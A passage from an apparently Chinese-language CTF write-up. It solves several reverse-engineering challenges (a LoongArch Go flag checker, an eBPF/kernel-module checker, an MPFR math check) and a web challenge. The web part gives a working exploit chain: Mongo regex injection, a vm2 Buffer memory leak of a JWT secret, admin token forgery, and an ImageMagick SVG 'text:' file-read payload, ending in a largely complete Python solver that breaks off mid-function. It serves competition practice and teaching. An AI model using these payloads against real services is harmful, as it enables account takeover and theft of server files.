        if len(ins) != 4 or ins[3] != 0x05 or ins[2] != 0x80:
            raise RuntimeError(f"bad target insn at {insn_idx}: {ins.hex()}")
        targets.append(ins[0])
    return targets


def main() -> None:
    data = Path(EXE).read_bytes()
    enc = data[BYTECODE_OFF:BYTECODE_OFF + BYTECODE_SIZE]
    bytecode = rc4(enc, build_key())

    targets = extract_targets(bytecode)
    assert len(targets) == 38

    aes_inv = [0] * 256
    for i, v in enumerate(AES_SBOX):
        aes_inv[v] = i

    flag = bytes(aes_inv[t] ^ k for t, k in zip(targets, K))

    assert flag.startswith(b"ACTF{") and flag.endswith(b"}")
    assert len(flag) == 38
    print(flag.decode())


if __name__ == "__main__":
    main()
```

### flagchecker

先解压查看文件类型：

```Plain
$ unzip flagchecker.zip
$ file flagchecker
flagchecker: ELF 64-bit LSB executable, LoongArch, version 1 (SYSV), statically linked, stripped
```

几个比较明显的信息：

```Plain
$ strings -a flagchecker | grep -E 'ACTF|Wrong|Verifier|CT77|JGqVVFpm|SHA|AES|flag'
flag
CT77IKGJ
*main.JGqVVFpm
Wrong!
AES-CBC
JGqVVFpm
Verifier
SHA2-256
main.(*JGqVVFpm).E3XDFQIV
main.(*JGqVVFpm).NAT7NCZZ
main.(*JGqVVFpm).ELK4X6I7
...
```

文件是 LoongArch64 的静态 Go 程序，并且被 stripped。虽然符号表没了，但 Go 程序通常还能从 `pclntab` 和字符串区里捞出函数名。这里能看到大量类似 `main.(*JGqVVFpm).XXXXXXX` 的方法名，基本可以判断程序把主要校验拆成了一堆小函数。

另外字符串里还能看到一些加密相关文本，比如 `AES-CBC`、`SHA2-256`。这些在一开始比较容易误导方向，后面确认核心校验并不是直接做 AES/SHA 对比。

用 IDA/Ghidra 直接打开时，架构是 LoongArch64，函数名也比较乱。比较有效的切入点是下面几个字符串：

- `Wrong!`
- `Verifier`
- `CT77IKGJ`
- `*main.JGqVVFpm`

沿着 `Wrong!` 的交叉引用往上追，可以找到输入检查的位置。整理后主流程大概如下：

```Go
func main() {
    var flag string
    fmt.Scan(&flag)

    checker := &Wj6J299f{}
    if checker.Verifier(flag) {
        fmt.Println("Correct!")
    } else {
        fmt.Println("Wrong!")
    }
}
```

`Verifier` 里有第一层格式检查。反编译出来会比较乱，手动整理后逻辑如下：

```Go
func (v *Wj6J299f) Verifier(s string) bool {
    if len(s) != 38 {
        return false
    }

    if s[0:5] != "ACTF{" {
        return false
    }

    if s[37] != '}' {
        return false
    }

    body := []byte(s[5:37])

    // 这里不是直接调用固定函数，而是通过反射找方法。
    // 反射出来的方法名最终是 CT77IKGJ。
    name := "CT77IKGJ"
    method := reflect.ValueOf(v).MethodByName(name)
    ret := method.Call([]reflect.Value{reflect.ValueOf(body)})
    return ret[0].Bool()
}
```

这里有一个坑：程序里能看到类似 `ACTF{d3c0y_fl4g_k33p_g01ng}` 的假 flag 相关内容，但它并不满足题目给的 32 位 hex 结构，也不在真正的 `CT77IKGJ` 校验路径上。这个字符串只是干扰项。

`CT77IKGJ` 是真正处理 32 字节内容的函数。它没有一次性比较字符串，而是构造 `JGqVVFpm` 对象，然后调用大量小方法，每个小方法只负责检查某一个字符。

```Plain
整理后的结构类似这样：func (v *Wj6J299f) CT77IKGJ(buf []byte) bool {
    if len(buf) != 32 {
        return false
    }

    c := &JGqVVFpm{}

    if !c.E3XDFQIV(buf[0])  { return false }
    if !c.NAT7NCZZ(buf[1])  { return false }
    if !c.ELK4X6I7(buf[2])  { return false }
    if !c.V427DDEC(buf[3])  { return false }
    // ...中间省略，都是同一种模式
    if !c.PNSPHOC5(buf[30]) { return false }
    if !c.I5Y6HCJI(buf[31]) { return false }

    return true
}
进入 E3XDFQIV 后，原始反编译结果会有不少临时变量和无意义运算。把类型和溢出规则按 byte 处理后，可以整理成这种形式：
func (c *JGqVVFpm) E3XDFQIV(x byte) bool {
    t := x
    t ^= 0x13
    t += 0x2a
    t ^= 0x59
    return t == 0x0a
}
```

这种代码看起来不是直接比较字符，但由于输入只有一个字节，化简方式很简单：把 `x` 当成 `uint8`，把每一步都按 8 bit 截断。上面的逻辑等价于：

```Python
def E3XDFQIV(x):
    t = x
    t = (t ^ 0x13) & 0xff
    t = (t + 0x2a) & 0xff
    t = (t ^ 0x59) & 0xff
    return t == 0x0a

for x in range(256):
    if E3XDFQIV(x):
        print(hex(x), chr(x))
```

第二、第三个 helper 也是一样的处理方式。实际还原时可以对每个方法做一个 0~255 的枚举，而不是手工解方程。只要某个 helper 的输入来自 `buf[i]`，就可以把它看成 `predicate_i(x)`，然后找出唯一能让它返回 `true` 的字节：

```Plain
def solve_one(predicate):
    ans = []
    for x in range(256):
        if predicate(x):
            ans.append(x)
    return ans
```

将32个字符全部拼接后得到结果

```Plain
ACTF{fce553ec44532f11ff209e1213c92acd}
```

### abyssgate

#### **1. 文件与总体结构**

题目给两个关键附件：

```Plain
abyssgate  用户态入口程序
abyss.ko   内核 misc 设备模块，设备名 /dev/abyss
```

`abyssgate` 不是最终逻辑，而是一层 unpacker；真正校验在解出的第二阶段 ELF、eBPF tracepoint 程序和内核模块三者共同完成。

整体路径：

```Plain
abyssgate 第一阶段
  -> 解密第二阶段 ELF
  -> 第二阶段读取 flag
  -> 加载 sys_enter_ioctl/sys_exit_ioctl eBPF
  -> ioctl /dev/abyss
  -> abyss.ko 内部状态最终与固定 32 字节比较
```

#### **2. 解包 abyssgate**

第一阶段有反调试检查：读取 `/proc/self/status` 的 `TracerPid`，再读取 `/proc/<pid>/comm`。如果 tracer 的 comm 不是 `sudo`，会走错误 XOR 解包路径。

正确分支是 RC4-like：

```Plain
ELF base: 0x400000
key VA:  0x5a82d0
blob VA: 0x479190
len:     0x12f108
drop:    0x200
```

key：

```Plain
4d2921a9568799e6e1fad98fb88c716eac8fd89588dde6f09421f3515ec3fd8d
```

解密后得到静态 ELF，关键字符串包括：

```Plain
Enter the flag:
ACTF{
/dev/abyss
syscalls/sys_enter_ioctl
syscalls/sys_exit_ioctl
```

#### **3. 第二阶段 ioctl 流程**

用 tracer 名称伪装成 `sudo` 后观察真实 syscall。第二阶段固定执行：

```Plain
ioctl(fd, 0xab00)          // reset
for round in 0..3:
    ioctl(fd, 0xc018ab04)  // negotiate, size 0x18, in/out
    ioctl(fd, 0x4018ab05)  // commit,    size 0x18, in
ioctl(fd, 0xab02)          // final transform
ioctl(fd, 0x4024ab03)      // check, size 0x24
```

最后 check 的前 32 字节是用户态写死的比较目标：

```Plain
a58353a9c2c24b5f7eb82b77e35c9f4de38da70dce9596137f480a81f9968718
```

因此目标变成：让 `/dev/abyss` 的内部 session 最终输出等于这 32 字节。

#### **4. eBPF 是关键干扰**

第二阶段会加载两个 eBPF 程序：

```Plain
tracepoint/syscalls/sys_enter_ioctl
tracepoint/syscalls/sys_exit_ioctl
```

它们通过 `bpf_probe_write_user` 改写 ioctl 参数。因此单纯 ptrace 到的 buffer 不是模块实际消费的数据，真实顺序是：

```Plain
用户态原始 buffer
  -> sys_enter_ioctl eBPF 改写
  -> abyss.ko ioctl handler copy_from_user
  -> handler 修改状态 / copy_to_user
  -> sys_exit_ioctl eBPF 再改写用户态 buffer
```

eBPF map value 中有：

```Plain
0x010 起：256 字节 S-box
0x110 起：256 字节逆/替代表
0x210 起：32 字节轮常量
```

对 `cmd5 = 0x4018ab05`，进入内核前 eBPF 会把 24 字节 commit 参数变换；模块实际用于分组密码的 8 字节为：

```Plain
block = arg[4:12] xor arg[16:24]
```

这一步必须模拟，否则后续状态完全对不上。

#### **5. abyss.ko handler 映射**

模块符号未 strip，但大量控制流平坦化。通过 rodata reloc 和调用行为确认 handler offset：

```Plain
0x2e70  reset/init
0x3400  cmd2 final transform
0x3750  cmd3 check
0x3930  cmd4 negotiate
0x3a60  cmd5 commit
```

将 `abyss.ko` 链接进用户态 harness，补齐这些 kernel stub 即可直接调用 handler：

```C
_copy_from_user -> memcpy
_copy_to_user   -> memcpy
ktime_get       -> controlled counter
__get_task_comm -> "sudo"
```

这样可以在不反复开 QEMU 的情况下复现模块内部 session 状态。

#### **6. cmd5 内核逻辑**

`cmd5` 的核心可化简为：

```Plain
if timing/ftrace check failed:
    round_keys ^= 0xdeaddead

if round > 0:
    round_key = lai_massey_apply_feedback(round_key, previous_ciphertext)

plain = arg[4:12] xor arg[16:24]
cipher = lai_massey_encrypt_block(round_key, plain)
session.blocks[round] = cipher
round++
```

4 轮 `cipher` 拼成 32 字节，之后 `cmd2` 再做最终变换。

#### **7. 逆 cmd2**

`cmd2` 先复制 4 个 8-byte ciphertext 到 `session[0x68:0x88]`，再做两段 byte-wise rolling transform：

1. 从前到后，初始 state `0xa5a5a5a5`。
2. 从后到前，初始 state `0x5a5a5a5a`。

每一步只依赖当前 state 和当前 byte，byte 空间只有 256，直接逐字节枚举即可逆。

对最终目标：

```Plain
a58353a9c2c24b5f7eb82b77e35c9f4de38da70dce9596137f480a81f9968718
```

逆 `cmd2` 得到进入 `cmd2` 前需要的 32 字节 ciphertext：

```Plain
2cc41a6d2a7153624f78eb7eeb42bb6171df0badae7fb0b2bfec2e658844867b
```

按 8 字节分成四轮目标 ciphertext：

```Plain
2cc41a6d2a715362
4f78eb7eeb42bb61
71df0badae7fb0b2
bfec2e658844867b
```

#### **8. 逆 Lai-Massey 分组**

初始 master key 由 reset 使用模块 rodata 的 `master_key` 初始化。每轮之后调用 `lai_massey_apply_feedback`，所以四轮实际 key 不同：

```Plain
key0 = 13f75f93334843b61892b98230e9061234b43e27c99c143ed50b115c2754b3d9
key1 = 7c3a2592c39eefa119fd74f82719d0be4eb551ea658be4e818711033f1f8a429
key2 = b769eac276a21aad493627372bacec4b81e59ab9908751d44bbe40f8cd0da89c
key3 = cda2ca49de15161fc24cec1799045b47a16ee0729c35f963809ecb827a011a34
```

`lai_massey_encrypt_block` 虽然控制流被平坦化，但它是确定的 8-byte block cipher。对每轮固定 key，用符号执行/SMT 或对 lifted 指令建模，约束输出等于上一节四个目标 ciphertext，得到四轮真正需要的 plaintext block：

```Plain
round0 plain = f1bd4cca8f184f99
round1 plain = e2eadf5d81049b3d
round2 plain = 79ed8174a816f384
round3 plain = 0ff798f8c6a5dfcd
```

这些值就是 eBPF enter 改写后，模块在 `cmd5` 中看到的：

```Plain
arg[4:12] xor arg[16:24]
```

#### **9. 反推 flag**

第二阶段从 flag hex 串生成 4 个 commit buffer。观察输入扰动可知依赖是三角形的：

```Plain
flag[0..7]   影响 round0，并继续影响后续 round
flag[8..15]  从 round1 开始影响
flag[16..23] 从 round2 开始影响
flag[24..31] 只影响 round3
```

更细地说，逐个 nibble 枚举 `0..f`，只检查当前 round plaintext 的已确定前缀字节，就会唯一命中。因此恢复算法是：

```Python
prefix = ""
for pos in range(32):
    round_id = pos // 8
    byte_prefix_len = pos % 8 + 1
    for c in "0123456789abcdef":
        test = prefix + c + "0" * (31 - pos)
        run second-stage generation + eBPF-enter simulation
        plain = arg[4:12] ^ arg[16:24]
        if plain[round_id][:byte_prefix_len] == target_plain[round_id][:byte_prefix_len]:
            prefix += c
            break
```

逐位结果：

```Plain
b02f97ee296b1218c4b771e3cbc21120
```

ACTF{b02f97ee296b1218c4b771e3cbc21120}

### calc my point

进入 `calc_my_point::main` 后，程序先打印输入提示，然后读取一行输入并去除首尾空白字符。

关键输入解析逻辑在主函数开头附近，反汇编里可以看到十进制解析和上限判断：

```YAML
36a70:  movzx  edx,BYTE PTR [rsi+rcx*1]
36a74:  add    edx,0xffffffd0        ; 字符减 '0'
36a77:  cmp    edx,0x9
36a7a:  ja     37571                 ; 不是数字则报错
36a80:  lea    eax,[rax+rax*4]
36a83:  lea    eax,[rdx+rax*2]       ; eax = eax * 10 + digit
...
36a9a:  cmp    eax,0x29b92701
36a9f:  jb     36b1a                 ; x < 0x29b92701 才继续
```

其中：

```Plain
0x29b92701 = 700000001
```

所以输入必须是十进制整数，并且满足：

```Plain
x < 700000001
```

整理成伪代码如下：

```JavaScript
fn main() {
    print!("Please Input your school id: ");

    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();

    let s = input.trim();
    let x: u32 = s.parse().unwrap();

    if x >= 700000001 {
        println!("wrong");
        return;
    }

    // 后面进入高精度数学表达式计算
    // check(x)
}
```

后半部分出现大量 MPFR/MPC 函数。动态重定位表可以把间接调用地址对应到具体函数：

```Plain
$ objdump -R calc_my_point | grep -E 'ece0|ecdf|ece1|ece2|ece3|ece4|ece5|ece6'
00000000000ecdf8 R_X86_64_RELATIVE  *ABS*+0x0000000000037ff0
00000000000ece00 R_X86_64_RELATIVE  *ABS*+0x0000000000048190
00000000000ece08 R_X86_64_RELATIVE  *ABS*+0x0000000000037990
00000000000ece10 R_X86_64_RELATIVE  *ABS*+0x00000000000473a0
00000000000ece18 R_X86_64_RELATIVE  *ABS*+0x00000000000379b0
00000000000ece20 R_X86_64_RELATIVE  *ABS*+0x0000000000038020
00000000000ece28 R_X86_64_RELATIVE  *ABS*+0x000000000003a100
00000000000ece30 R_X86_64_RELATIVE  *ABS*+0x00000000000593c0
00000000000ece40 R_X86_64_RELATIVE  *ABS*+0x0000000000051480
00000000000ece48 R_X86_64_RELATIVE  *ABS*+0x000000000003c4e0
00000000000ece50 R_X86_64_RELATIVE  *ABS*+0x0000000000049680
00000000000ece58 R_X86_64_RELATIVE  *ABS*+0x000000000003bcd0
00000000000ece60 R_X86_64_RELATIVE  *ABS*+0x000000000003c200
```

继续查符号名：

```Plain
$ nm -C calc_my_point | grep -E '0000000000037ff0|00000000000379b0|0000000000038020|000000000003a100|0000000000048190|00000000000473a0|00000000000593c0|0000000000051480|000000000003c4e0|0000000000049680|000000000003c200|0000000000037990'
0000000000037ff0 T mpc_init3
0000000000037990 T mpc_clear
00000000000379b0 T mpc_exp
0000000000038020 T mpc_log
000000000003a100 T mpc_sub
0000000000048190 T mpfr_set_ui
00000000000473a0 T mpfr_set4
00000000000593c0 T __gmpfr_set_sj
0000000000051480 T mpfr_init2
000000000003c4e0 T mpfr_div_2ui
0000000000049680 T mpfr_sub
000000000003c200 T mpfr_less_p
```

这说明程序不是普通整数比较，而是用高精度浮点库构造了一个数学表达式，然后判断结果是否落在一个很小的误差区间内。

`main` 中间有一段基于常量表的栈式解释器。常量表起始位置附近为：

```Plain
36d09:  lea    rax,[rip+0xfffffffffffd34f0]  ; 表地址约为 0xa200
36d10:  mov    r13,QWORD PTR [r15+rax*1]
36d14:  cmp    r13,0xffffffffffffffff
36d18:  je     36e00                         ; -1 作为一个分隔/运算标记
36d1e:  test   r13,r13
36d21:  jne    37000                         ; 非 0 常量入栈
```

结合后续对 `mpc_exp`、`mpc_log`、`mpc_sub` 和 MPFR 基本操作的调用，可以把栈式表达式还原成下面的数学形式：

```Plain
50 * (cos(pi * x / 33033) + sin(pi * x / 32768))
+ exp(-x) * tanh(x / 20 + 3)
```

程序后面构造了 `100` 和一个很小的误差范围。可以看到先设置 `1`，再执行 `mpfr_div_2ui(..., 0x90)`：

```YAML
37141:  mov    esi,0x1
37146:  mov    rdi,r14
37149:  xor    edx,edx
3714b:  call   mpfr_set_ui
...
37170:  mov    edx,0x90
37175:  mov    rsi,rdi
37178:  xor    ecx,ecx
3717a:  call   mpfr_div_2ui       ; 1 / 2^0x90 = 2^-144
...
371b0:  mov    esi,0x64
371b5:  mov    rdi,r14
371b8:  xor    edx,edx
371ba:  call   mpfr_set_ui        ; 100
```

随后通过两次 `mpfr_less_p` 做区间比较：

```YAML
37357:  lea    rsi,[rsp+0x1c0]
37367:  call   mpfr_less_p
3736d:  test   eax,eax
3736f:  je     373a8

37371:  lea    rdi,[rsp+0x50]
37376:  lea    rsi,[rsp+0x1c0]
3737e:  call   mpfr_less_p
37384:  test   eax,eax
```

因此校验可以写成：

```Python
from mpmath import mp

mp.dps = 200

def f(x):
    x = mp.mpf(x)
    return 50 * (mp.cos(mp.pi * x / 33033) + mp.sin(mp.pi * x / 32768)) \
           + mp.e ** (-x) * mp.tanh(x / 20 + 3)

# 程序等价于判断 f(x) 是否非常接近 100
# 误差量级为 2^-144
```

核心部分为：

```Plain
50 * (cos(pi * x / 33033) + sin(pi * x / 32768))
```

因为：

```Plain
cos(t) <= 1
sin(t) <= 1
```

所以：

```Plain
cos(pi * x / 33033) + sin(pi * x / 32768) <= 2
```

要让整体结果接近 `100`，三角函数部分必须同时取到最大值：

```Plain
cos(pi * x / 33033) = 1
sin(pi * x / 32768) = 1
```

分别解同余条件。

第一部分： cos(pi * x / 33033) = 1 当角度为 `2k*pi` 时成立：

pi * x / 33033 = 2k*pi

x = 66066k 所以 x ≡ 0 (mod 66066)

第二部分：sin(pi * x / 32768) = 1当角度为 `pi/2 + 2k*pi` 时成立：

pi * x / 32768 = pi/2 + 2k*pi

x / 32768 = 1/2 + 2k

x = 16384 + 65536k 所以 x ≡ 16384 (mod 65536)

最终变成求 CRT：

x ≡ 0      (mod 66066)

x ≡ 16384  (mod 65536)

x < 700000001

Exp:

```Python
# solve.py
from math import gcd

LIMIT = 700000001

m1, r1 = 66066, 0
m2, r2 = 65536, 16384

# 简单暴力枚举第一个同余，规模很小
ans = []
for x in range(r1, LIMIT, m1):
    if x % m2 == r2:
        ans.append(x)

print(ans)
for x in ans:
    print(f"ACTF{{{x}}}")

# 顺便输出一些信息，确认解的唯一性
print("count =", len(ans))
print("gcd =", gcd(m1, m2))
```

## Web

### AAA'26

1. 通过 reviewer profile 导入逻辑中的 Mongo 查询注入泄漏 reviewer invite code。
2. 使用 invite code 认领 reviewer 身份。
3. 通过 reviewer filter 中的 vm2 表达式执行点泄漏 Node.js Buffer slab 内存。
4. 从内存中恢复 JWT secret。
5. 伪造 admin JWT。
6. 创建论文并用 admin 权限把论文状态改成 Accepted。
7. 上传 camera-ready 文件，利用 ImageMagick/Ghostscript 处理 SVG 时的 text:/flag 读取文件。

#### Reviewer Profile Mongo 查询注入

```JavaScript
paper-submission-system/lib/profileImport.js


return {
  used: false,
  track: submitted.track,
  kind: packet.queue,
  rubricId: rubric.rubricId,
  [packet.slotField]: packet.slotValue
};
```

这里 packet.slotField 和 packet.slotValue 来自导入的 profile JSON。系统本意是根据 reviewer profile 去匹配 committee service 的 assignment slot，但由于字段名和值可控，最终可以影响 Mongo 查询条件。

上传 reviewer profile 时构造：

```Bash
{
  "source": "External service record",
  "label": "Committee shadow slot",
  "committee": {
    "registration": {
      "reference": {
        "$regex": "^prefix"
      },
      "season": "AAA26"
    },
    "desk": "overflow"
  }
}
```

当 `reference` 被导入后，会进入 assignment slot 查询条件，形成类似：

```Bash
{
  used: false,
  track: "systems",
  kind: "...",
  rubricId: "...",
  code: { "$regex": "^prefix" }
}
```

随后访问：

```
POST /reviewer/profile/service-sync
```

根据页面回显判断是否存在匹配 slot：

```JavaScript
Committee service desk has an available assignment slot.
Committee service desk has not found an assignment slot yet.
```

因此可以用布尔 oracle 逐位爆破未使用的 `reviewer invite code`。

远程爆出的 invite code：

```
f037f8c7e71a2a5627a7b86682630fd0c52b
```

然后用固定邮箱认领 reviewer：

```JavaScript
POST /reviewer/claim

email=committee-shadow@aaa26.big1
code=f037f8c7e71a2a5627a7b86682630fd0c52b
```

认领成功后即可访问 reviewer 功能。

#### Reviewer Filter vm2 Buffer Slab 泄漏

代码位置：

```JavaScript
paper-submission-system/lib/filters.js
paper-submission-system/routes/reviewer.js
```

reviewer 可以调用：

```
POST /api/reviewer/filter
```

传入表达式：

```JavaScript
{
  "expression": "..."
}
```

服务端会把表达式放入 vm2 中执行，并根据表达式结果返回匹配论文数量。

虽然题目对 `Buffer.allocUnsafe` 做了限制，但仍然可以利用 `Buffer.from('X').buffer` 访问底层 ArrayBuffer。Node.js 的 Buffer 通常来自 slab 分配器，底层 slab 中可能残留同进程中的敏感字符串。

测试 payload：

```JavaScript
(() => {
  let x = Buffer.from('X');
  let s = Buffer.from(x.buffer).toString('latin1');
  return /aaa26_[0-9a-f]{48}/.test(s);
})()
```

系统的 JWT secret 格式为：

```JavaScript
jwtSecret: process.env.JWT_SECRET || `aaa26_${randomBytes(24).toString("hex")}`
```

所以可以用正则：

```
aaa26_[0-9a-f]{48}
```

在 Buffer slab 中搜索 JWT secret。

#### 逐位泄漏 JWT Secret

`/api/reviewer/filter` 返回的是表达式是否命中论文的结果，可以把它作为布尔 oracle。

核心判断逻辑如下：

```JavaScript
(() => {
  let p = "aaa26_5d3d";
  for (let i = 0; i < 2; i++) {
    let x = Buffer.from('X');
    let s = Buffer.from(x.buffer).toString('latin1');
    let m = s.match(/aaa26_[0-9a-f]{48}/g) || [];
    for (let j = 0; j < m.length; j++) {
      if (m[j].startsWith(p)) return true;
    }
  }
  return false;
})()
```

通过逐位尝试 `0123456789abcdef`，即可恢复完整 secret。

远程泄漏得到：

**`aaa26_5d3d001ecdb231a2bb63635f0f849044f978520eab70b269`**

#### 伪造 Admin JWT

系统使用 HS256 签名 JWT，拿到 secret 后可以直接伪造 admin token。

Payload 示例：

```JSON
{
  "id": "000000000000000000000000",
  "username": "admin",
  "role": "admin",
  "iat": 1778386000,
  "exp": 1778472400
}
```

签名逻辑：

```Python
import base64
import hashlib
import hmac
import json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def sign_jwt(secret, payload):
    header = {"alg": "HS256", "typ": "JWT"}
    signing_input = ".".join([
        b64url(json.dumps(header, separators=(",", ":")).encode()),
        b64url(json.dumps(payload, separators=(",", ":")).encode()),
    ])
    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{b64url(sig)}"
```

然后再用伪造的 admin token 修改状态，只有论文状态为 `Accepted` 时，作者才能上传 camera-ready 文件。

#### Camera-ready Thumbnail 任意文件读取

camera-ready 文件上传后，服务端会调用 `pdf-image` 生成缩略图，本质上走 ImageMagick/Ghostscript 处理流程。

上传文件虽然表单名叫 PDF，但后端主要按路径交给转换器处理。因此可以上传 SVG 内容，并利用 ImageMagick 支持的 `text:` 协议读取本地文件。

Payload：

```XML
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="1800" height="360" viewBox="40 40 420 35">
  <rect x="-1000" y="-1000" width="5000" height="5000" fill="white"/>
  <image xlink:href="text:/flag" x="0" y="0" width="612" height="792"/>
</svg>
```

上传：

```
POST /papers/:paper_id/camera-ready
```

之后访问 paper view 页面，找到生成的 thumbnail 路径：

```
/public/camera-ready/thumbs/<timestamp>-<random>-0.png
```

最终Exp如下

```Python
import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import secrets
import subprocess
import time
from pathlib import Path

import requests

HEX = "0123456789abcdef"

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def sign_jwt(secret, payload):
    header = {"alg": "HS256", "typ": "JWT"}
    signing_input = ".".join([
        b64url(json.dumps(header, separators=(",", ":")).encode()),
        b64url(json.dumps(payload, separators=(",", ":")).encode()),
    ])
    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{b64url(sig)}"

def char_codes(value):
    return ",".join(str(ord(c)) for c in value)

class Solver:
    def __init__(self, base_url, timeout=30, out_dir=None):
        self.base = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "Connection": "close",
            "User-Agent": "aaa26-full-solver/1.0",
        })
        suffix = secrets.token_hex(5)
        self.username = f"u{suffix}"
        self.email = f"{self.username}@example.com"
        self.password = "Passw0rd!"
        self.out_dir = Path(out_dir or os.getcwd()).resolve()
        self.out_dir.mkdir(parents=True, exist_ok=True)

    def request(self, method, path, session=None, **kwargs):
        kwargs.setdefault("timeout", self.timeout)
        url = f"{self.base}{path}"
        sess = session or self.session
        last_error = None
        for attempt in range(1, 6):
            try:
                return sess.request(method, url, **kwargs)
            except requests.RequestException as exc:
                last_error = exc
                print(f"[!] {method} {path} retry {attempt}: {exc}", flush=True)
                time.sleep(1.2 * attempt)
        raise RuntimeError(f"{method} {path} failed after retries: {last_error}")

    def register_and_login(self):
        r = self.request(
            "POST",
            "/register",
            data={"username": self.username, "email": self.email, "password": self.password},
            allow_redirects=False,
        )
        print(f"[*] registered {self.username}: HTTP {r.status_code}", flush=True)

        r = self.request(
            "POST",
            "/login",
            data={"username": self.username, "password": self.password},
            allow_redirects=False,
        )
        if not self.session.cookies.get("token"):
            raise RuntimeError(f"login failed: HTTP {r.status_code}")
        print("[*] logged in", flush=True)

    def upload_profile_with_reference(self, reference):
        profile = {
            "source": "External service record",
            "label": "Committee shadow slot",
            "committee": {
                "registration": {
                    "reference": reference,
                    "season": "AAA26",
                },
                "desk": "overflow",
            },
        }
        data = [
            ("track", "systems"),
            ("areas", "systems"),
            ("areas", "review process"),
            ("areas", "artifact sanity"),
            ("score", "100"),
            ("statement", "I can review systems, review process, and artifact sanity."),
        ]
        files = {"profileFile": ("service.json", json.dumps(profile), "application/json")}
        r = self.request("POST", "/reviewer/profile", data=data, files=files)
        if "Reviewer profile could not be imported." in r.text:
            raise RuntimeError("profile import failed")

    def submit_profile_once(self):
        r = self.request("POST", "/reviewer/profile/submit")
        if "Reviewer profile submitted for committee service sync." not in r.text and "Submitted" not in r.text:
            raise RuntimeError("profile submit did not reach Submitted state")
        print("[*] reviewer profile submitted", flush=True)

    def sync_matches(self):
        r = self.request("POST", "/reviewer/profile/service-sync")
        text = re.sub(r"\s+", " ", r.text)
        if "Committee service desk has an available assignment slot." in text:
            return True
        if "Committee service desk has not found an assignment slot yet." in text:
            return False
        raise RuntimeError(f"unexpected sync response: {text[:300]}")

    def invite_oracle(self, regex):
        for attempt in range(1, 5):
            try:
                self.upload_profile_with_reference({"$regex": regex})
                return self.sync_matches()
            except Exception as exc:
                print(f"[!] invite oracle retry {attempt} for {regex!r}: {exc}", flush=True)
                time.sleep(attempt)
        raise RuntimeError(f"invite oracle failed for {regex!r}")

    def ensure_unused_invite_exists(self):
        self.upload_profile_with_reference({"$ne": None})
        if not self.sync_matches():
            raise RuntimeError("no unused reviewer invite matched; reset the local instance and rerun")
        print("[*] unused reviewer invite is present", flush=True)

    def leak_invite_code(self):
        code = ""
        for pos in range(36):
            candidates = list(HEX)
            while len(candidates) > 1:
                half = (len(candidates) + 1) // 2
                left = candidates[:half]
                regex = f"^{code}[{''.join(left)}]"
                candidates = left if self.invite_oracle(regex) else candidates[half:]
            code += candidates[0]
            if not self.invite_oracle(f"^{code}"):
                raise RuntimeError(f"invite prefix verification failed at {code}")
            print(f"[+] invite code {pos + 1:02d}/36: {code}", flush=True)
        return code

    def claim_reviewer(self, code):
        r = self.request(
            "POST",
            "/reviewer/claim",
            data={"email": "committee-shadow@aaa26.big1", "code": code},
            allow_redirects=False,
        )
        print(f"[*] claim reviewer: HTTP {r.status_code} -> {r.headers.get('location')}", flush=True)
        r = self.request("GET", "/reviewer/assignments", allow_redirects=False)
        if r.status_code != 200 or "Review Assignments" not in r.text:
            raise RuntimeError(f"reviewer access not confirmed: HTTP {r.status_code}")
        print("[+] reviewer access confirmed", flush=True)

    def reviewer_filter_hit(self, expression):
        r = self.request("POST", "/api/reviewer/filter", json={"expression": expression})
        data = r.json()
        if not data.get("ok"):
            raise RuntimeError(f"reviewer filter rejected expression: {data}")
        return int(data.get("count", 0)) > 0

    def jwt_prefix_oracle(self, prefix, charset=None, loops=1):
        p_codes = char_codes(prefix)
        if charset is None:
            test = "m[j].startsWith(p)"
        else:
            c_codes = char_codes(charset)
            test = "m[j].startsWith(p)&&cs.includes(m[j][p.length])"
        expression = (
            "(()=>{"
            f"let p=String.fromCharCode({p_codes});"
            f"let cs=String.fromCharCode({c_codes if charset is not None else ''});"
            f"for(let i=0;i<{loops};i++){{"
            "let x=Buffer.from('X');"
            "let s=Buffer.from(x.buffer).toString('latin1');"
            "let m=s.match(/aaa26_[0-9a-f]{48}/g)||[];"
            f"for(let j=0;j<m.length;j++){{if({test})return true;}}"
            "}"
            "return false})()"
        )
        return self.reviewer_filter_hit(expression)

    def leak_jwt_secret(self):
        prefix = "aaa26_"
        if not self.jwt_prefix_oracle(prefix, loops=2):
            raise RuntimeError("JWT secret prefix was not visible in Buffer slab")
        print("[*] JWT secret prefix visible through Buffer slab", flush=True)

        while len(prefix) < len("aaa26_") + 48:
            candidates = list(HEX)
            while len(candidates) > 1:
                half = (len(candidates) + 1) // 2
                left = candidates[:half]
                candidates = left if self.jwt_prefix_oracle(prefix, "".join(left), loops=2) else candidates[half:]
            prefix += candidates[0]
            print(f"[+] jwt secret {len(prefix) - 6:02d}/48: {prefix}", flush=True)
        return prefix

    def create_paper(self):
        pdf = (
            b"%PDF-1.3\n"
            b"1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
            b"2 0 obj<</Type/Pages/Count 0>>endobj\n"
            b"trailer<</Root 1 0 R>>\n%%EOF\n"
        )
        r = self.request(
            "POST",
            "/papers/new",
            data={
                "title": f"Camera Ready Exploit {secrets.token_hex(3)}",
                "abstract": "A short paper about proceedings preparation.",
                "authors": "Exploit Author, exploit@example.com",
                "topics": "systems",
            },
            files={"pdf": ("draft.pdf", pdf, "application/pdf")},
            allow_redirects=False,
        )
        location = r.headers.get("location", "")
        match = re.search(r"/papers/([0-9a-f]{24})/view", location)
        if not match:
            raise RuntimeError(f"paper creation failed: HTTP {r.status_code}, location={location!r}")
        paper_id = match.group(1)
        print(f"[+] paper created: {paper_id}", flush=True)
        return paper_id

    def forge_admin_session(self, secret):
        now = int(time.time())
        token = sign_jwt(secret, {
            "id": "000000000000000000000000",
            "username": "admin",
            "role": "admin",
            "iat": now,
            "exp": now + 24 * 60 * 60,
        })
        admin = requests.Session()
        admin.headers.update({"Connection": "close", "User-Agent": "aaa26-full-solver/1.0"})
